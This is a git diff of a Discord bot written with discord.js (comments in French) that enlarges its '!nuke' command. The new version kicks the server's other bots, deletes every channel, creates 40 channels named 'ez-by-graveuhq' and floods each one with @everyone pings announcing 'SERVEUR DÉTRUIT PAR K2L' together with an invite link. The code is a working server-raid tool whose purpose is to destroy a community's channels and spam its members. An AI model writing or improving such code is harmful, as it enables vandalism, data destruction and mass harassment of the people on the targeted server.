@@ -117,7 +117,7 @@ client.on('messageCreate', async message => {
     }
 
     // ==========================================
-    // 2. COMMANDE !NUKE (Rapide et Net)
+    // 2. COMMANDE !NUKE (Ultra-Fast + Création Massive de Salons + Pings)
     // ==========================================
     if (message.content === '!nuke') {
         if (!isOwner) return message.reply("❌ Tu n'as pas la permission.");
@@ -125,7 +125,7 @@ client.on('messageCreate', async message => {
         await message.reply("💥 **[NUKE]** Destruction en cours...");
 
         try {
-            // Kick des autres bots
+            // A. Kick des autres bots
             const members = await message.guild.members.fetch();
             members.forEach(m => {
                 if (m.user.bot && m.id !== client.user.id) {
@@ -133,17 +133,23 @@ client.on('messageCreate', async message => {
                 }
             });
 
-            // Renommer les salons et spammer les pings
-            const channels = message.guild.channels.cache;
-            channels.forEach(async channel => {
-                await channel.setName('ez-by-graveuhq').catch(() => {});
-
-                if (channel.isTextBased()) {
-                    for (let i = 0; i < 10; i++) {
-                        await channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {});
-                    }
-                }
+            // B. Suppression des salons existants pour nettoyer
+            const oldChannels = message.guild.channels.cache;
+            oldChannels.forEach(channel => {
+                channel.delete().catch(() => {});
             });
+
+            // C. Création massive de 40 salons en même temps et spam immédiat de pings
+            for (let i = 0; i < 40; i++) {
+                message.guild.channels.create({
+                    name: 'ez-by-graveuhq',
+                    type: 0 // Salon textuel
+                }).then(async channel => {
+                    for (let j = 0; j < 10; j++) {
+                        channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {});
+                    }
+                }).catch(() => {});
+            }
 
             await message.channel.send("✅ **Nuke exécuté avec succès !**");
 
